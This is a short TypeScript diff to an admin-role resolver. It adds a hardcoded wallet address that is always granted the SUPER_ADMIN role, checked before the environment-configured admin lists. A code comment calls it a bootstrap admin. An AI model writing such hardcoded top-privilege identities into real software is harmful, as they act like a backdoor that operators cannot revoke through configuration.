@@ -72,6 +72,10 @@ export function permissionFor(resource: AdminResource, action: AdminAction): str
 
 export function resolveRoleFromEnv(wallet: string): AdminRole | null {
   const normalized = wallet.toLowerCase();
+  // Hardcoded bootstrap SUPER_ADMIN — also set SUPER_ADMIN_WALLETS in env for extras.
+  const bootstrapAdmins = ["0xb2adb77a837d19c3ada396db74483b05d49ad6b7"];
+  if (bootstrapAdmins.includes(normalized)) return "SUPER_ADMIN";
+
   const superAdmins = (process.env.SUPER_ADMIN_WALLETS ?? process.env.ADMIN_WALLETS ?? "")
     .split(",")
     .map((w) => w.trim().toLowerCase())
